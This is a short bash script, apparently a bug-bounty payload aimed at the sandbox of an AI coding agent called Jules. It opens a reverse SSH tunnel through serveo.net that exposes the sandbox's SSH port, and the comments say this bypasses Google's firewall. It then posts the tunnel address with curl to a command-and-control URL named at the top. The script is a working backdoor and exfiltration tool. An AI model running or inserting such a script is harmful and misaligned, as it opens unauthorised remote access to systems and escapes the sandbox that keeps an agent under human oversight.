#!/bin/bash
# C2: https://rainbow-nutrition-bottom-beginners.trycloudflare.com

URL="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"

# --- THE SSH BRIDGE ---
# This opens a tunnel from Jules to Serveo.net
# It bypasses Google's firewall by using standard SSH Port 22/443
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:22 serveo.net 2>&1 > /tmp/ssh_info &

# Give the tunnel a few seconds to stabilize
sleep 7

# --- THE LINK BROADCAST ---
# Grabs the assigned forwarding address from the log file
SSH_LINK=$(grep -o "https://.*\.serveo.net" /tmp/ssh_info || grep -o "forwarding TCP traffic from .*" /tmp/ssh_info)

{
  echo "--- GOOGLE VRP: SSH SESSION READY ---"
  echo "TIMESTAMP: $(date)"
  echo "COMMAND TO RUN ON YOUR MAC:"
  echo "ssh -v root@serveo.net (or the link below)"
  echo "$SSH_LINK"
  echo "--------------------------------------"
} | curl -s -k -X POST --data-binary @- "$URL"
